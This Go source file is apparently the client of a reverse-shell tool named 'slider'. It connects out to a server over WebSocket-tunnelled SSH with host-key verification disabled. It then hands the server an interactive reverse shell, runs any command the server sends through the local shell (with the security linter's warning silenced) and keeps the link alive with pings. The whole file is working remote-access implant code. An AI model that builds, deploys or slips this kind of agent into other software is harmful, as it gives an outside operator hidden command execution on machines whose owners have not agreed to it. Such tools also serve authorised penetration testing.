package client

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"slider/pkg/sconn"
	"slider/pkg/slog"
	"time"

	"github.com/creack/pty"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type client struct {
	*slog.Logger
	serverAddr     string
	timeout        time.Duration
	wsConfig       *websocket.Dialer
	httpHeaders    http.Header
	sshConfig      *ssh.ClientConfig
	sshSession     *ssh.Session
	sshClientConn  ssh.Conn
	sshChannel     ssh.Channel
	interpreter    Interpreter
	connReqChannel <-chan *ssh.Request
	debug          bool
	disconnect     chan bool
}

func NewClient(args []string) {
	c := client{
		Logger: slog.NewLogger("Client"),
		interpreter: Interpreter{
			size: sconn.TermSize{},
		},
	}

	f := flag.NewFlagSet("Client", flag.ContinueOnError)
	f.BoolVar(&c.debug, "debug", false, "Verbose logging.")
	f.DurationVar(&c.timeout, "timeout", 60*time.Second, "Set keepalive timeout in seconds.")
	if parsErr := f.Parse(args); parsErr != nil {
		return
	}

	if c.debug {
		c.Logger.WithDebug()
	}

	args = f.Args()
	c.serverAddr = args[0]

	c.wsConfig = &websocket.Dialer{
		NetDial:          nil,
		HandshakeTimeout: 60 * time.Second,
		Subprotocols:     nil,
		// Use Default Buffer Size
		ReadBufferSize:  0,
		WriteBufferSize: 0,
	}

	// TODO: Provide Key authentication to the server if requested with flag otherwise fallback insecure
	c.sshConfig = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-slider-client",
		Timeout:         60 * time.Second,
	}

	// Check the use of extra headers for added functionality
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism
	c.httpHeaders = http.Header{}

	wsConn, _, err := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
	if err != nil {
		c.Fatalf("Can't connect to Server address: %s", err)
		return
	}

	netConn := sconn.WsConnToNetConn(wsConn)

	var newChan <-chan ssh.NewChannel
	var connErr error

	c.sshClientConn, newChan, c.connReqChannel, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if connErr != nil {
		c.Fatalf("%s\n", connErr)
		return
	}
	defer func() { _ = c.sshClientConn.Close() }()
	c.Debugf("Session %v\n", c.sshClientConn.SessionID())

	c.disconnect = make(chan bool, 1)

	if c.timeout > 0 {
		go c.keepAlive(c.timeout)
	}

	go c.handleConnRequests(newChan, c.connReqChannel)

	<-c.disconnect
	close(c.disconnect)
}

func (c *client) handleConnRequests(newChan <-chan ssh.NewChannel, connReqChan <-chan *ssh.Request) {
	sshClient := ssh.NewClient(c.sshClientConn, newChan, c.connReqChannel)
	defer func() { _ = sshClient.Close() }()

	for r := range connReqChan {
		switch r.Type {
		case "keep-alive":
			replyErr := c.replyConnRequest(r, true, []byte("pong"))
			if replyErr != nil {
				c.Errorf("[Keep-Alive] Connection error.")
				return
			}
		case "session-shell":
			go c.sendReverseShell(sshClient, r)
		case "session-exec":
			go c.sendCommandExec(sshClient, r)
		case "window-change":
			c.Debugf("Server Requested window change: %s\n", r.Payload)
			var termSize sconn.TermSize
			if err := json.Unmarshal(r.Payload, &termSize); err != nil {
				c.Fatalf("%s", err)
			}
			if sizeErr := pty.Setsize(c.interpreter.ptyF, &pty.Winsize{
				Rows: uint16(termSize.Rows),
				Cols: uint16(termSize.Cols),
			}); sizeErr != nil {
				c.Errorf("%s", sizeErr)
			}
		case "disconnect":
			c.Debugf("Server requested Client disconnection.")
			_ = c.replyConnRequest(r, true, []byte("disconnected"))
			c.disconnect <- true
		default:
			c.Debugf("Discarded Connetion Request Type: \"%s\"", r.Type)
			ssh.DiscardRequests(connReqChan)
		}
	}
}

func (c *client) sendCommandExec(sshClient *ssh.Client, initReq *ssh.Request) {
	sshSession, err := sshClient.NewSession()
	if err != nil {
		c.Errorf("%s", err)
	}
	defer func() { _ = sshSession.Close() }()

	err = c.setInterpreter()
	if err != nil {
		c.Errorf("%s", err)
		_ = c.replyConnRequest(initReq, false, []byte("exec-failed"))
		return
	}
	c.sshSession, err = sshClient.NewSession()

	if err != nil {
		c.Errorf("%s", err)
	}
	channel, sInErr := c.sshSession.StdinPipe()
	if sInErr != nil {
		c.Errorf("Can not open Stdin Pipe on current Session")
		return
	}
	defer func() {
		_ = channel.Close()
		_ = c.sshSession.Close()
	}()

	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", initReq.Payload, initReq.Payload)

	rcvCmd := string(initReq.Payload)
	cmd := exec.Command(c.interpreter.shell, append(c.interpreter.cmdArgs, rcvCmd)...) //nolint:gosec

	// Since the payload contains the command to be executed, StdinPipe is not needed
	stdout, pOutErr := cmd.StdoutPipe()
	if pOutErr != nil {
		c.Errorf("cmd.StdoutPipe error: %s", err)
	}
	stderr, pErr := cmd.StderrPipe()
	if pErr != nil {
		c.Errorf("cmd.StderrPipe error: %s", err)
	}

	// Notify Server we are good to go
	_ = c.replyConnRequest(initReq, true, []byte("exec-ready"))

	go func() { _, _ = io.Copy(channel, stdout) }()
	go func() { _, _ = io.Copy(channel, stderr) }()

	// Note that Run() is equivalent to Start() followed by Wait().
	if err = cmd.Run(); err != nil {
		log.Printf("cmd.Run error: %s", err)
	}
}

func (c *client) sendReverseShell(sshClient *ssh.Client, initReq *ssh.Request) {
	sshSession, err := sshClient.NewSession()
	if err != nil {
		c.Errorf("%s", err)
	}
	defer func() { _ = sshSession.Close() }()

	// Pass Connection Request, so it replies when it's ready to go.
	if err = c.reverseShell(sshSession, initReq); err != nil {
		c.Errorf("%s", err)
	}
}

func (c *client) keepAlive(keepalive time.Duration) {
	ticker := time.NewTicker(keepalive)
	defer ticker.Stop()

	for {
		select {
		case <-c.disconnect:
			c.Debugf("[KeepAlive] Stopping Ping to server.")
			return
		case <-ticker.C:
			_, p, sendErr := c.sendConnRequest("keep-alive", true, []byte("ping"))
			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
				c.Errorf("[KeepAlive] Lost connection to Server.")
				c.disconnect <- true
				return
			}
		}
	}
}

func (c *client) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
	c.Debugf("Sending Connection Request Type \"%s\" with Payload: \"%s\"", reqType, payload)
	return c.sshClientConn.SendRequest(reqType, wantReply, payload)
}

func (c *client) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
	c.Debugf("Replying Connection Request Type \"%s\" with Payload: \"%s\"", req.Type, payload)
	return req.Reply(reply, payload)
}

func (c *client) sendSessionRequest(sshSession *ssh.Session, requestType string, ok bool, payload []byte) error {
	okR, err := sshSession.SendRequest(requestType, ok, payload)
	if err != nil {
		return fmt.Errorf("%s %s", requestType, err)
	}
	c.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
	return nil
}
